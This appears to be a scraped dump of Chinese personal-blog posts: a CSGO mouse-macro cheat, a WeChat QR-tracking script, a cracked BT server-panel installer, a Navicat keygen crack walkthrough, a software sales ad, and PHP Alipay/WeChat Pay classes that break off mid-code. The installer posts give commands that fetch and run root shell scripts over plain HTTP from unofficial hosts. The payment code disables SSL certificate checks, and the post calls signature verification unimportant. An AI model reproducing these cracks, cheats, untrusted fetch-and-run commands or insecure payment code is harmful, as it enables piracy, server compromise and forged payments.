\u0026#34;----------------------------------------------------------------------------\u0026#34; sleep $step done exit 0 ","date":"2021-01-25T07:07:00Z","permalink":"https://blog.aaayun.cc/archives/566.html","title":"宝塔linux版设置秒级监控"},{"content":"简介 开源，无加密\n目前，我们已经写了一个AK，你可以试试看，效果绝对不错\n如果没有响应，我们需要启动Logitech驱动程序管理员\n下载地址 CSGO罗技lua鼠标宏.rar\n","date":"2021-01-06T04:34:00Z","permalink":"https://blog.aaayun.cc/archives/524.html","title":"csgo罗技鼠标宏"},{"content":"因为项目需求 监控微信个人二维码是否打开\n思路：\n微信官方并没有提供这个API，经过二维码识别提取到了一个https链接，此类链接微信以及浏览器打开则指向微信官网地址，此思路pass\n经过一系列的各种关键字Google到 html5有触摸事件\n解决方案：\n给img标签添加touchstart touchmove touchend这三个事件，以此监控img标签所活动状态，此方法不能准确使用，只能获取大概\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 \u0026lt;img id=\u0026#34;qrcode\u0026#34; src=\u0026#34;/qr/{{:base64_encode($url)}}\u0026#34; ontouchstart=\u0026#34;gtouchstart(this)\u0026#34; ontouchmove=\u0026#34;gtouchmove(this)\u0026#34; ontouchend=\u0026#34;gtouchend(this)\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var localqid = localStorage.getItem(\u0026#34;localqid\u0026#34;); var qid = \u0026#34;{{$qid}}\u0026#34;; if(null == localqid || \u0026#39;\u0026#39; == localqid) { localStorage.setItem(\u0026#34;localqid\u0026#34;,qid); // $.ajax({url:\u0026#34;{{:url(\u0026#39;plus\u0026#39;)}}?id=\u0026#34;+qid}); }else if(localqid != qid ){ localStorage.setItem(\u0026#34;localqid\u0026#34;,qid); // $.ajax({url:\u0026#34;{{:url(\u0026#39;plus\u0026#39;)}}?id=\u0026#34;+qid}); } var timeOutEvent=0; function gtouchstart(obj){ timeOutEvent = setTimeout(\u0026#34;longPress()\u0026#34;,300); return false; }; function gtouchend(obj){ clearTimeout(timeOutEvent); return false; }; function gtouchmove(obj){ clearTimeout(timeOutEvent); timeOutEvent = 0; }; function longPress(){ timeOutEvent = 0; $(\u0026#34;#qrcode\u0026#34;).attr(\u0026#39;ontouchend\u0026#39;,\u0026#39;\u0026#39;); $(\u0026#34;#qrcode\u0026#34;).attr(\u0026#39;ontouchmove\u0026#39;,\u0026#39;\u0026#39;); $(\u0026#34;#qrcode\u0026#34;).attr(\u0026#39;ontouchstart\u0026#39;,\u0026#39;\u0026#39;); if(null == localqid || \u0026#39;\u0026#39; == localqid){ localStorage.setItem(\u0026#34;touch\u0026#34;+qid,\u0026#34;touch\u0026#34;); $.ajax({url:\u0026#34;{{:url(\u0026#39;plus\u0026#39;)}}?id=\u0026#34;+qid}); }else if(localqid != qid ){ localStorage.setItem(\u0026#34;touch\u0026#34;+qid,\u0026#34;touch\u0026#34;); $.ajax({url:\u0026#34;{{:url(\u0026#39;plus\u0026#39;)}}?id=\u0026#34;+qid}); }else{ var touch = localStorage.getItem(\u0026#34;touch\u0026#34;+qid); if(null == touch || \u0026#39;\u0026#39; == touch){ localStorage.setItem(\u0026#34;touch\u0026#34;+qid,\u0026#34;touch\u0026#34;); $.ajax({url:\u0026#34;{{:url(\u0026#39;plus\u0026#39;)}}?id=\u0026#34;+qid}); } } } \u0026lt;/script\u0026gt; ","date":"2020-10-25T08:47:00Z","permalink":"https://blog.aaayun.cc/archives/514.html","title":"监控微信个人二维码是否打开"},{"content":"脚本简介\n本次面板版本：7.4.3\n本脚本支持一键安装79版宝塔面板 以及 已经安装宝塔面板升级79版！\n感谢大家使用该脚本，本脚本未加密，有没有后门大家自己看就知道了，仅仅将官方的脚本本地化了，未经任何修改，请放心使用！\n本次脚本支持：Centos 7、Debian、Ubuntu！\n之前已安装此79版脚本，直接点击更新即可，直接升级7.4.3破解版\n宝塔面板 7.4.3 安装命令\nCentos安装命令：根据系统执行框内命令开始安装（大约2分钟完成面板安装）\n1 yum install -y wget \u0026amp;\u0026amp; wget -O install.sh http://bt.79mz.cn/install/install_6.0.sh \u0026amp;\u0026amp; sh install.sh 试验性Centos/Ubuntu/Debian安装命令 独立运行环境（py3.7） 可能存在少量兼容性问题 不断优化中：极速安装方式 (安装时间1至10分钟)\n1 curl -sSO http://bt.79mz.cn/install/install_panel.sh \u0026amp;\u0026amp; bash install_panel.sh Ubuntu/Deepin安装命令：极速安装方式 (安装时间1至10分钟)\n1 wget -O install.sh http://bt.79mz.cn/install/install-ubuntu_6.0.sh \u0026amp;\u0026amp; sudo bash install.sh Debian安装命令：极速安装方式 (安装时间1至10分钟)\n1 wget -O install.sh http://bt.79mz.cn/install/install-ubuntu_6.0.sh \u0026amp;\u0026amp; bash install.sh Fedora安装命令：极速安装方式 (安装时间1至10分钟)\n1 wget -O install.sh http://bt.79mz.cn/install/install_6.0.sh \u0026amp;\u0026amp; bash install.sh 已经安装面板\nLinux面板7.4.3升级命令：极速安装方式 (安装时间1至10秒)\n1 wget -O /home/update6.sh http://bt.79mz.cn/install/update6.sh \u0026amp;\u0026amp; bash /home/update6.sh 收费版Nginx防火墙脚本\n收费Nginx防火墙（面板先安装在执行脚本）：\n直接面板安装防火墙使用，不在出现不显示拦截问题，不需要在配合bt命令！\nApache防火墙脚本\n收费Apache防火墙（面板先安装在执行脚本）：\n直接面板安装防火墙使用，不在出现不显示拦截问题，不需要在配合bt命令！\n","date":"2020-08-25T11:31:00Z","permalink":"https://blog.aaayun.cc/archives/516.html","title":"宝塔面板专业版7.4.3破解版一键脚本"},{"content":"查看了很多教程花了半小时才弄好可真不容易 参考：https://gitee.com/andisolo/navicat-keygen\n注意：安装使用 Navicat Premium v15.0.3\n先去官网下载navicat 你会得到一个AppImage文件\n例如 navicat15-premium-cs.AppImage重命名为 navicat.AppImage\n1.提取AppImage文件到文件夹里\n1 2 3 4 5 6 su mkdir navicat15-premium-cs mount -o loop navicat.AppImage navicat15-premium-cs cp -r navicat15-premium-cs navicat umount navicat15-premium-cs rm -rf navicat15-premium-cs 2.编译安装（如果你觉得git下载太慢 keystone-master.zip）\n1 2 3 4 5 6 7 8 9 10 apt install libcapstone-dev apt install cmake git clone https://github.com/keystone-engine/keystone.git cd keystone mkdir build cd build ../make-share.sh sudo make install sudo ldconfig apt install rapidjson-dev 3.生成私钥 (下载navicat-patcher和navicat-keygen 激活工具.zip)\n1 2 chmod +x navicat-patcher ./navicat-patcher navicat 4.激活\n1 navicat-keygen --text ./RegPrivateKey.pem 1）选择类别\n2）选择语语言\n3）主版本号\n4）输入用户名)\n5）输入组织名\n6）在navicat中找到注册 输入序列号\n7）点击 激活\n8）选择 手动激活\n9）复制 请求码 到keygen，连按两次回车结束\n10）最终你会得到一个base64编码的 激活码\n11）将之复制到 手动激活 的窗口，然后点击 激活\n这就成功了 博主亲测成功\n","date":"2020-03-16T09:41:00Z","permalink":"https://blog.aaayun.cc/archives/518.html","title":"Linux Navicat15 破解"},{"content":"宝塔面板 7.0.3 安装命令\nCentos安装命令：\n1 yum install -y wget \u0026amp;\u0026amp; wget -O install.sh http://download.miui.uk:25041/install/install_6.0.sh \u0026amp;\u0026amp; sh install.sh 试验性Centos/Ubuntu/Debian安装命令支持ipv6，注意使用root权限执行此命令 (支持Centos8)\n1 curl -sSO http://download.miui.uk:25041/install/new_install.sh \u0026amp;\u0026amp; bash new_install.sh Ubuntu/Deepin安装命令：\n1 wget -O install.sh http://download.miui.uk:25041/install/install-ubuntu_6.0.sh \u0026amp;\u0026amp; sudo bash install.sh Debian安装命令：\n1 wget -O install.sh http://download.miui.uk:25041/install/install-ubuntu_6.0.sh \u0026amp;\u0026amp; bash install.sh Fedora安装命令：\n1 wget -O install.sh http://download.miui.uk:25041/install/install_6.0.sh \u0026amp;\u0026amp; bash install.sh Linux面板7.0.3升级命令：\n1 curl http://download.miui.uk:25041/install/update6.sh|bash 插件相关脚本\n收费Nginx防火墙（面板先安装在执行脚本）：\n1 wget -O btwaf.sh http://download.miui.uk:25041/install/btwaf.sh \u0026amp;\u0026amp; bash btwaf.sh install 免费Nginx防火墙（无需面板安装）：\n1 wget -O free_btwaf.sh http://download.miui.uk:25041/install/free_btwaf.sh \u0026amp;\u0026amp; bash free_btwaf.sh install 收费Apache防火墙（面板先安装在执行脚本）\n1 wget -O btwaf_httpd.sh http://download.miui.uk:25041/install/btwaf_httpd.sh \u0026amp;\u0026amp; bash btwaf_httpd.sh install 主机异常登录插件脚本\n1 wget -O host_login.sh http://download.miui.uk:25041/install/host_login.sh \u0026amp;\u0026amp; bash host_login.sh install 河马webshell查杀插件脚本\n1 wget -O hm_shell_san.sh http://download.miui.uk:25041/install/hm_shell_san.sh \u0026amp;\u0026amp; bash hm_shell_san.sh install 修复工具\n解除拉黑、解锁文件脚本：\n1 wget -O waf.sh http://download.miui.uk:25041/install/waf.sh \u0026amp;\u0026amp; bash waf.sh ","date":"2019-12-25T18:54:57Z","permalink":"https://blog.aaayun.cc/archives/513.html","title":"宝塔面板7.X高级破解版代码"},{"content":"微营销平台 主要用于产品的宣传推广，以订单处理为核心，帮助企业快速构建专属的全渠道营销订单平台。企业通过平台可以全面展示商品，快速引流客户，提升内外部协同效率，数据驱动获取更多利润。\n您可以在后台自由编辑产品页面，产品内容，业务员，各种订单数据的查看。\n更好的助力微信产品推广。\n主要功能 1.所有页面都支持自定义编辑，可自定义具体产品商品内容。\n2.所有订单都支持导出，方便你的发货，快捷上传物流单号。\n3.各种统计信息一目了然，使你更清楚自己的业务范围。\n4.支持添加组长与员工，每个组长和员工都有独立后台与链接。\n5.支持链接，活动，产品，组长员工的无限次添加。\n6.支持短信发送、物流信息查询，售后订单处理，后台操作简单。\n7.支持微信支付，支付宝支付，货到付款等多种付款方式。\n下面为系统案例部分图片展示\n具体功能请联系博主本人 发测试站体验\n目前售价 8500 代码开源 包一个月更新 后续更新2000/年\n更新日志 {timeline}\n{timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-8-13\n增加IfWin支付\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-23\n修改金额显示错误 修改后台清空缓存失效问题 增加后台当前版本号显示 增加后台用户入口 增加后台手机端入口 增加中战支付\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-22\n修改短网址的样式 增加随机立减金额 增加底部订单查询 增加所有手机端购买数统计 增加后台产品链接\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-21\n增加源铭支付 优化商品页ui显示\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-20\n增加订单导出时间字段 优化订单汇总ui显示 增加数据统计\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-18\n增加产品页客服外链功能\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-17\n修复后台售后处理modal弹窗问题 更新框架缓存文件以及模板引擎 增加异步时更新时间 调整广告位\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-16\n更新扩展包物流导入 组长登入ui显示问题\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-15\n更新泛域名解析 增加订单导出 增加布丁云支付等\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-8\n更新短信监控 补发等细节性问题\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-6-3\n更新框架核心文件以及依赖包,现支持php8.0 运行速度提高40%\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-5-21\n修复短链等问题 增加星云支付 更新在线更新接口\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-5-20\n修复后台修改密码问题 增加腾讯云存储功能 增加用户自定义域\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-5-19\n修复后台短网址修改错误 添加授权版本\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-4-28\n增加后台在线更新功能\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-4-3\n从php7.x升级到php8.0\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2021-3-10\n增加微信公众号支付\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2020-12-10\n从旧版本完整升级至新版本,新版采用AY框架\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2019-10-1\n禁止用户重复下单\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2019-9-14\n增加商品页优惠卷功能\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2019-9-1\n增加商品页广告功能\n{/timeline-item} {timeline-item color=\u0026quot;#19be6b\u0026quot;}\n2019-8-10\n发布微营销系统\n{/timeline-item} {/timeline}\n图片预览 ","date":"2019-11-04T23:27:00Z","permalink":"https://blog.aaayun.cc/archives/502.html","title":"微营销系统"},{"content":"分享自用的支付宝支付类\n目前只封装了 订单查询以及app支付\n更多的支付 后期会集成\n异步主要商户订单号查询 并确定金额是否与数据库中一致以及判断该商户订单号是否处理过（谨记）\n个人觉得验签并不重要 有订单查询以及数据库订单验证就行了\n过多的就不介绍了 源码有注释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 \u0026lt;?php /** * @author anderyly * @email admin@aaayun.cc * @link https://blog.aaayun.cc/ * @copyright Copyright (c) 2019 */ class AliPay { // 应用ID public $appId; // 私钥 public $privateKey; // 公钥 public $publicKey; // 异步地址 public $notify_url; // 同步地址 public $return_url; //返回数据格式 public $format = \u0026#34;json\u0026#34;; //版本 public $version = \u0026#34;1.0\u0026#34;; // 编码 public $charset = \u0026#34;UTF-8\u0026#34;; //签名类型 public $signType = \u0026#34;RSA2\u0026#34;; // 配置 public $config; // 网关 public $gatewayUrl = \u0026#34;https://openapi.alipay.com/gateway.do\u0026#34;; public function __construct($appid, $privateKey, $publicKey, $notify_url, $return_url) { $this-\u0026gt;appId = $appid; $this-\u0026gt;privateKey = $privateKey; $this-\u0026gt;publicKey = $publicKey; $this-\u0026gt;notify_url = $notify_url; $this-\u0026gt;return_url = $return_url; $this-\u0026gt;config = [ \u0026#39;alipay_sdk\u0026#39; =\u0026gt; \u0026#39;alipay-sdk-php-20180705\u0026#39;, \u0026#39;app_id\u0026#39; =\u0026gt; $this-\u0026gt;appId, \u0026#39;notify_url\u0026#39; =\u0026gt; $this-\u0026gt;notify_url, \u0026#39;sign_type\u0026#39; =\u0026gt; $this-\u0026gt;signType, \u0026#39;charset\u0026#39; =\u0026gt; $this-\u0026gt;charset, \u0026#39;timestamp\u0026#39; =\u0026gt; date(\u0026#39;Y-m-d H:i:s\u0026#39;, time()), \u0026#39;version\u0026#39; =\u0026gt; $this-\u0026gt;version ]; } /** * app支付 * @param $out_trade_no 商户订单号 * @param $total_amount 金额 * @param $subject 标题 * @return arrray */ public function app($out_trade_no, $total_amount, $subject) { $method = \u0026#39;alipay.trade.app.pay\u0026#39;; $config = $this-\u0026gt;config; $config[\u0026#39;method\u0026#39;] = $method; $biz = [ \u0026#39;total_amount\u0026#39; =\u0026gt; $total_amount, \u0026#39;product_code\u0026#39; =\u0026gt; \u0026#39;QUICK_MSECURITY_PAY\u0026#39;, \u0026#39;subject\u0026#39; =\u0026gt; $subject, \u0026#39;out_trade_no\u0026#39; =\u0026gt; $out_trade_no ]; $arr = [ \u0026#39;subject\u0026#39; =\u0026gt; $biz[\u0026#39;subject\u0026#39;], \u0026#39;out_trade_no\u0026#39; =\u0026gt; $out_trade_no, \u0026#39;total_amount\u0026#39; =\u0026gt; $biz[\u0026#39;total_amount\u0026#39;], \u0026#39;appid\u0026#39; =\u0026gt; $this-\u0026gt;appId, \u0026#39;notify_url\u0026#39; =\u0026gt; $this-\u0026gt;notify_url, \u0026#39;sign_type\u0026#39; =\u0026gt; $this-\u0026gt;signType ]; $biz_content = json_encode($biz, JSON_UNESCAPED_UNICODE); $config[\u0026#39;biz_content\u0026#39;] = $biz_content; ksort($config); $config[\u0026#39;sign\u0026#39;] = $this-\u0026gt;sign($config); $params_url = \u0026#39;\u0026#39;; foreach ($config as $k =\u0026gt; $v) { if (!empty($v)) { $params_url .= $k . \u0026#39;=\u0026#39; . urlencode($v) . \u0026#39;\u0026amp;\u0026#39;; } } $params_url = rtrim($params_url, \u0026#39;\u0026amp;\u0026#39;); $arr[\u0026#39;sign\u0026#39;] = $params_url; return $arr; } /** * 订单查询 * @param $out_trade_no * @param $total_amount * @return bool|arrray */ public function orderQuery($out_trade_no, $total_amount = \u0026#39;\u0026#39;) { $method = \u0026#39;alipay.trade.query\u0026#39;; $config = $this-\u0026gt;config; $config[\u0026#39;method\u0026#39;] = $method; unset($config[\u0026#39;notify_url\u0026#39;]); $biz = [ \u0026#39;out_trade_no\u0026#39; =\u0026gt; $out_trade_no ]; $biz_content = json_encode($biz, JSON_UNESCAPED_UNICODE); $config[\u0026#39;biz_content\u0026#39;] = $biz_content; ksort($config); $config[\u0026#39;sign\u0026#39;] = $this-\u0026gt;sign($config); $res = $this-\u0026gt;curl($config); $res = json_decode($res, true); $res = $res[\u0026#39;alipay_trade_query_response\u0026#39;]; if ($res[\u0026#39;code\u0026#39;] == 10000 and $res[\u0026#39;msg\u0026#39;] == \u0026#39;Success\u0026#39; and $res[\u0026#39;trade_status\u0026#39;] == \u0026#39;TRADE_SUCCESS\u0026#39;) { if (empty($total_amount)) { return $res; } else { if ($res[\u0026#39;total_amount\u0026#39;] == $total_amount) { return $res[\u0026#39;trade_no\u0026#39;]; } else { return false; } } } else { return false; } } /** * curl请求 * @param $data * @return bool|int|mixed|string */ private function curl($data) { @header(\u0026#34;Content-type: text/html;charset=gb2312\u0026#34;); $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_SSLVERSION, 1); curl_setopt($ch, CURLOPT_URL, $this-\u0026gt;gatewayUrl); if (is_array($data)) { curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); } elseif (is_string($data)) { curl_setopt($ch, CURLOPT_POSTFIELDS, $data); } curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_POST, true); $content = curl_exec($ch); curl_close($ch); return $content; } /** * 签名 * @param $data * @return bool|string */ private function sign($params) { $stringToBeSigned = \u0026#34;\u0026#34;; $i = 0; foreach ($params as $k =\u0026gt; $v) { if (false === $this-\u0026gt;checkEmpty($v) \u0026amp;\u0026amp; \u0026#34;@\u0026#34; != substr($v, 0, 1)) { if ($i == 0) { $stringToBeSigned .= \u0026#34;$k\u0026#34; . \u0026#34;=\u0026#34; . \u0026#34;$v\u0026#34;; } else { $stringToBeSigned .= \u0026#34;\u0026amp;\u0026#34; . \u0026#34;$k\u0026#34; . \u0026#34;=\u0026#34; . \u0026#34;$v\u0026#34;; } $i++; } } unset ($k, $v); // 私钥处理 $res = \u0026#34;-----BEGIN RSA PRIVATE KEY-----\u0026#34; . PHP_EOL . wordwrap($this-\u0026gt;privateKey, 64, PHP_EOL, true) . PHP_EOL . \u0026#34;-----END RSA PRIVATE KEY-----\u0026#34;; ($res) or die(\u0026#39;您使用的私钥格式错误，请检查RSA私钥配置\u0026#39;); openssl_sign($stringToBeSigned, $sign, $res, OPENSSL_ALGO_SHA256); $key = base64_encode($sign); return $key; } private function checkEmpty($value) { if (!isset($value)) return true; if ($value === null) return true; if (trim($value) === \u0026#34;\u0026#34;) return true; return false; } } ","date":"2019-11-04T22:56:00Z","permalink":"https://blog.aaayun.cc/archives/497.html","title":"分享自用支付宝支付类"},{"content":"博主之封装过一个微信支付类 很长时间没有更新了 现在分享一下自用的微信支付类\n该类含有微信app支付 h5支付 公众号支付（jsapi） 订单查询\nnative扫码支付后面会添加\n异步主要商户订单号查询 并确定金额是否与数据库中一致以及判断该商户订单号是否处理过（谨记）\n个人觉得验签并不重要 有订单查询以及数据库订单验证就行了\n过多的就不介绍了 源码有注释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 \u0026lt;?php /** * @author anderyly * @email anderyly@sina.com * @link https://blog.aaayun.cc/ * @copyright Copyright (c) 2018 */ class WxPay { // 微信分配的公众账号ID public $appId; // 微信支付分配的商户号 public $mch_id; // 微信支付分配的商户密钥 public $key; // 回调地址 public $notify_url; // 随机字符串 public $nonce_str; // 站点名称 public $webName; // 站点url地址 public $webUrl; // h5支付成功后跳转的地址 public $redirect_url; /** * [__construct 初始化配置] */ public function __construct($data) { $this-\u0026gt;appId = $data[\u0026#39;appId\u0026#39;]; $this-\u0026gt;mch_id = $data[\u0026#39;mch_id\u0026#39;]; $this-\u0026gt;key = $data[\u0026#39;key\u0026#39;]; $this-\u0026gt;notify_url = $data[\u0026#39;notify_url\u0026#39;]; if (isset($data[\u0026#39;webName\u0026#39;])) $this-\u0026gt;webName = $data[\u0026#39;webName\u0026#39;]; if (isset($data[\u0026#39;webUrl\u0026#39;])) $this-\u0026gt;webUrl = $data[\u0026#39;webUrl\u0026#39;]; if (isset($data[\u0026#39;redirect_url\u0026#39;])) $this-\u0026gt;redirect_url = $data[\u0026#39;redirect_url\u0026#39;]; $this-\u0026gt;nonce_str = $this-\u0026gt;rand_code(); } /** * [h5 html5支付] * @param out_trade_no [订单号] * @param $body [商品描述] * @param $ip [ip地址] * @param $total_fee [订单总金额] * @return array|bool */ public function h5($out_trade_no, $body, $ip, $total_fee) { $url = \u0026#39;https://api.mch.weixin.qq.com/pay/unifiedorder\u0026#39;; $data = [ \u0026#39;appid\u0026#39; =\u0026gt; $this-\u0026gt;appId, \u0026#39;mch_id\u0026#39; =\u0026gt; $this-\u0026gt;mch_id, \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;spbill_create_ip\u0026#39; =\u0026gt; $ip, \u0026#39;total_fee\u0026#39; =\u0026gt; $total_fee * 100, \u0026#39;out_trade_no\u0026#39; =\u0026gt; $out_trade_no, \u0026#39;nonce_str\u0026#39; =\u0026gt; $this-\u0026gt;nonce_str, \u0026#39;notify_url\u0026#39; =\u0026gt; $this-\u0026gt;notify_url, \u0026#39;trade_type\u0026#39; =\u0026gt; \u0026#39;MWEB\u0026#39;, \u0026#39;scene_info\u0026#39; =\u0026gt; \u0026#34;{\u0026#39;h5_info\u0026#39;:{\u0026#39;type\u0026#39;: \u0026#39;WAP\u0026#39;,\u0026#39;wap_url\u0026#39;: $this-\u0026gt;webUrl,\u0026#39;wap_name\u0026#39;: $this-\u0026gt;webName}}\u0026#34; ]; $data[\u0026#39;sign\u0026#39;] = $this-\u0026gt;sign($data); //获取签名 $data = $this-\u0026gt;curlWx($url, $this-\u0026gt;ToXml($data)); if ($data) { $res = $this-\u0026gt;FromXml($data); if (isset($res[\u0026#39;return_code\u0026#39;]) and $res[\u0026#39;return_code\u0026#39;] != \u0026#39;SUCCESS\u0026#39; and isset($res[\u0026#39;return_msg\u0026#39;]) and $res[\u0026#39;return_msg\u0026#39;] == \u0026#39;OK\u0026#39; and isset($res[\u0026#39;result_code\u0026#39;]) and $res[\u0026#39;result_code\u0026#39;] == \u0026#39;SUCCESS\u0026#39;) { exit(\u0026#34;签名失败！\u0026#34;); } else { $url = $res[\u0026#39;mweb_url\u0026#39;] . \u0026#39;\u0026amp;redirect_url=\u0026#39; . urlencode($this-\u0026gt;redirect_url); exit(\u0026#39;\u0026lt;script src=\u0026#34;https://open.mobile.qq.com/sdk/qqapi.js?_bid=152\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;mqq.ui.openUrl({ target: 2,url: \u0026#34;\u0026#39; . $url . \u0026#39;\u0026#34;});\u0026lt;/script\u0026gt;\u0026#39;); } } } /** * [app 移动端二次签名] * @param out_trade_no [订单号] * @param $body [商品描述] * @param $ip [ip地址] * @param $total_fee [订单总金额] * @return array|bool */ public function app($out_trade_no, $body, $ip, $total_fee) { $url = \u0026#39;https://api.mch.weixin.qq.com/pay/unifiedorder\u0026#39;; $data = [ \u0026#39;appid\u0026#39; =\u0026gt; $this-\u0026gt;appId, \u0026#39;mch_id\u0026#39; =\u0026gt; $this-\u0026gt;mch_id, \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;spbill_create_ip\u0026#39; =\u0026gt; $ip, \u0026#39;total_fee\u0026#39; =\u0026gt; $total_fee * 100, \u0026#39;out_trade_no\u0026#39; =\u0026gt; $out_trade_no, \u0026#39;nonce_str\u0026#39; =\u0026gt; $this-\u0026gt;nonce_str, \u0026#39;notify_url\u0026#39; =\u0026gt; $this-\u0026gt;notify_url, \u0026#39;trade_type\u0026#39; =\u0026gt; \u0026#39;APP\u0026#39;, ]; $data[\u0026#39;sign\u0026#39;] = $this-\u0026gt;Sign($data); $data = $this-\u0026gt;curlWx($url, $this-\u0026gt;ToXml($data)); if ($data) { $res = $this-\u0026gt;FromXml($data); if ($res[\u0026#39;return_code\u0026#39;] != \u0026#39;SUCCESS\u0026#39;) { return false; } else { $arr = [ \u0026#39;prepayid\u0026#39; =\u0026gt; $res[\u0026#39;prepay_id\u0026#39;], \u0026#39;appid\u0026#39; =\u0026gt; $this-\u0026gt;appId, \u0026#39;partnerid\u0026#39; =\u0026gt; $this-\u0026gt;mch_id, \u0026#39;package\u0026#39; =\u0026gt; \u0026#39;Sign=WXPay\u0026#39;, \u0026#39;noncestr\u0026#39; =\u0026gt; $this-\u0026gt;nonce_str, \u0026#39;timestamp\u0026#39; =\u0026gt; time(), ]; $sign = $this-\u0026gt;sign($arr, 1); $arr[\u0026#39;out_trade_no\u0026#39;] = $out_trade_no; $arr[\u0026#39;return_code\u0026#39;] = $res[\u0026#39;return_code\u0026#39;]; $arr[\u0026#39;sign\u0026#39;] = $sign; return $arr; } } else { return false; } } /** * [h5 html5支付] * @param $out_trade_no [订单号] * @param $body [商品描述] * @param $ip [ip地址] * @param $total_fee [订单总金额] * @param $openid [授权用户的openid] * @return array|bool */ public function jsapi($out_trade_no, $body, $ip, $total_fee, $openid) { $url = \u0026#39;https://api2.mch.weixin.qq.com/pay/unifiedorder\u0026#39;; $data = [ \u0026#39;appid\u0026#39; =\u0026gt; $this-\u0026gt;appId, \u0026#39;mch_id\u0026#39; =\u0026gt; $this-\u0026gt;mch_id, \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;spbill_create_ip\u0026#39; =\u0026gt; $ip, \u0026#39;total_fee\u0026#39; =\u0026gt; $total_fee * 100, \u0026#39;out_trade_no\u0026#39; =\u0026gt; $out_trade_no, \u0026#39;nonce_str\u0026#39; =\u0026gt; $this-\u0026gt;nonce_str, \u0026#39;notify_url\u0026#39; =\u0026gt; $this-\u0026gt;notify_url, \u0026#39;trade_type\u0026#39; =\u0026gt; \u0026#39;JSAPI\u0026#39;, \u0026#39;openid\u0026#39; =\u0026gt; $openid ]; $data[\u0026#39;sign\u0026#39;] = $this-\u0026gt;Sign($data, 1); $data = $this-\u0026gt;curlWx($url, $this-\u0026gt;ToXml($data)); if ($data) { $res = $this-\u0026gt;FromXml($data); if ($res[\u0026#39;return_code\u0026#39;] != \u0026#39;SUCCESS\u0026#39;) { return false; } else { $arr = [ \u0026#39;appId\u0026#39; =\u0026gt; $res[\u0026#39;appid\u0026#39;], \u0026#39;package\u0026#39; =\u0026gt; \u0026#39;prepay_id=\u0026#39; . 